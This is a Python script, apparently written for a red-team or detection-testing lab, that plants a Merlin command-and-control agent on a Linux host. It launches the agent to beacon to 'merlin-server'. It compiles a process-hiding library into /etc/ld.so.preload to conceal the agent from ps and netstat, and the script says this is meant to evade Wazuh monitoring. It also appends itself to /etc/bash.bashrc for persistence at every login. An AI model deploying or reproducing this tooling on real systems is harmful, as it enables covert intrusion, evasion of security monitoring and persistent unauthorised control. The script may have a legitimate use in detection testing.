#!/usr/bin/python3
import logging
import os
import subprocess
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(message)s')
logger = logging.getLogger(__name__)


class MerlinFoothold:
    def __init__(self):
        self._foothold_script_path = os.path.realpath(__file__)
        self._merlin_process_name = "merlinAgent-Lin"
        self._merlin_path = "/opt/merlin/merlinAgent-Linux-x64"
        self._hider_path = "/tmp/libprocesshider.c"
        self._shared_obj_path = "/usr/local/lib/libprocesshider.so"
        self._preload_path = "/etc/ld.so.preload"
        self._pid_file = Path("/tmp/run.swp")
        self._bashrc_path = "/etc/bash.bashrc"
        self._bashrc_foothold_command = f"python3 {self._foothold_script_path}"

    @staticmethod
    def log_stdout_stderr(calling_process_name: str, process: subprocess.CompletedProcess, log_level: str = "debug"):
        log_via_level = getattr(logger, log_level)
        for line in process.stdout.splitlines():
            log_via_level(f'{calling_process_name}: {line}')
        for line in process.stderr.splitlines():
            log_via_level(f'{calling_process_name}: {line}')

    @staticmethod
    def does_pid_exist(pid: int):
        try:
            logger.debug(f"Attempting to check if pid '{pid}' is active")

            calling_process_name = "kill"
            process = subprocess.run([calling_process_name,
                                      "-0", str(pid)],
                                     capture_output=True,
                                     text=True,
                                     check=True)

            MerlinFoothold.log_stdout_stderr(calling_process_name=calling_process_name, process=process)

        except subprocess.CalledProcessError as err:
            logger.debug(f"Foothold Merlin pid '{pid}' is NOT active")
            logger.debug(err)
            return False
        else:
            logger.debug(f"Foothold Merlin Pid '{pid}' IS active")
            return True

    def run_netstat(self):
        calling_process_name = "netstat"
        process = subprocess.run([calling_process_name,
                                  "-tulpn"],
                                 capture_output=True,
                                 text=True,
                                 check=True)

        MerlinFoothold.log_stdout_stderr(calling_process_name=calling_process_name, process=process, log_level="info")

    def run_ps(self):
        logger.info("Running `ps`")
        calling_process_name = "ps"
        process = subprocess.run([calling_process_name,
                                  "-e", "-o", "command"],
                                 capture_output=True,
                                 text=True,
                                 check=True)

        MerlinFoothold.log_stdout_stderr(calling_process_name=calling_process_name, process=process, log_level="info")

    def is_merlin_visible(self):
        try:
            calling_process_name = "pgrep"
            process = subprocess.run([calling_process_name,
                                      self._merlin_process_name],
                                     capture_output=True,
                                     text=True,
                                     check=True)

            MerlinFoothold.log_stdout_stderr(calling_process_name=calling_process_name, process=process)

        except subprocess.CalledProcessError as err:
            logger.info("Merlin is NOT visible")
            return False
        else:
            logger.info("Merlin IS visible")
            return True


    def get_pid(self, process_name: str):
        logger.debug(f"Attempting to get the pid of {process_name}")

        calling_process_name = "pgrep"
        process = subprocess.run([calling_process_name,
                                  process_name, "-o"],
                                 capture_output=True,
                                 text=True,
                                 check=True)

        MerlinFoothold.log_stdout_stderr(calling_process_name=calling_process_name, process=process)

        for line in process.stdout.splitlines():
            logger.debug(f"For process '{process_name}' found pid: '{line}'")
            return line


    def does_foothold_exist(self):
        logger.info("Starting checks to see if previous foothold exists...")
        if self._pid_file.is_file():
            pid = self._pid_file.read_text()
            if self.does_pid_exist(int(pid)) and self.does_bashrc_foothold_exist() and not self.is_merlin_visible():
                logger.info("Complete foothold exists!")
                return True
        logger.info("Complete foothold does NOT exist")
        return False


    def start_merlin(self):
        logger.info("Attempting to start Merlin")
        process = subprocess.Popen([self._merlin_path,
                                    "-v",
                                    "--url",
                                    "https://merlin-server:443",
                                    "--proto",
                                    "http3"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)


    def cloak_merlin(self):
        logger.info("Starting compilation of libprocesshider\n"
                    f"An artifact from this compilation will be injected into '{self._preload_path}'\n"
                    f"Code injected into '{self._preload_path}' will run before any program on the system\n"
                    "Once this code is injected, Merlin should be invisible to commands that are used to monitor processes (e.g., `netstat`, `ps`, etc.)\n"
                    "By default, Wazuh uses `netstat` to monitor network connections")
        calling_process_name = "gcc"
        process = subprocess.run([calling_process_name,
                                  "-Wall",
                                  "-fPIC",
                                  "-shared",
                                  "-o",
                                  self._shared_obj_path,
                                  self._hider_path,
                                  "-ldl"],
                                 capture_output=True, text=True)

        MerlinFoothold.log_stdout_stderr(calling_process_name=calling_process_name, process=process)

        logger.info("Successfully compiled libprocesshider")

        self.set_preload()


    def set_preload(self):
        with open(self._preload_path, "a") as file:
            file.write(self._shared_obj_path)
        logger.info(f"Injected '{self._shared_obj_path}' into '{self._preload_path}'")


    def remove_preload(self):
        try:
            os.remove(self._preload_path)
        except FileNotFoundError:
            pass
        else:
            logger.info(f"Successfully removed {self._preload_path}")
            logger.info(f"This is needed to make the Merlin Agent temporarily visible, so we can gather metadata about the process (and keep the process invisible into the future)")

    def run_observability_commands(self):
        logger.info("Running observability commands")
        self.run_ps()
        self.run_netstat()

    def run(self):
        if self.does_foothold_exist():
            exit(0)

        if not self.is_merlin_visible():
            self.start_merlin()

        self.run_observability_commands()
        # If Merlin is killed but cloak still exists, we need
        # remove the cloak in order to get the pid of the new merlin process
        # Ultimately, this pid _should_ help stealth because this script can, into the future, check this pid and immediately exit if the pid is cloaked
        self.remove_preload()
        merlin_pid = self.get_pid(process_name=self._merlin_process_name)

        self.cloak_merlin()
        if not self.does_bashrc_foothold_exist():
            self.establish_bashrc_foothold()

        # pid_file signifies a successful foothold
        self.persist_pid_file(merlin_pid=merlin_pid)
        self.run_observability_commands()


    def does_bashrc_foothold_exist(self):
        with open(self._bashrc_path) as f:
            if self._bashrc_foothold_command in f.read():
                logger.debug(".bashrc foothold exists!")
                return True
        logger.debug(".bashrc foothold does NOT exist!")
        return False


    def establish_bashrc_foothold(self):
        with open(self._bashrc_path, "a") as file:
            file.write(self._bashrc_foothold_command + "\n")
        logger.info(f"Injecting '{self._bashrc_foothold_command}' into '{self._bashrc_path}' for persistence\n"
                    f"Whenever a user logs into the system, this command will be executed")

    def persist_pid_file(self, merlin_pid):
        logger.debug(f"Attempting to persist pid {merlin_pid}")
        self._pid_file.write_text(f"{merlin_pid}\n")


foothold = MerlinFoothold()
foothold.run()
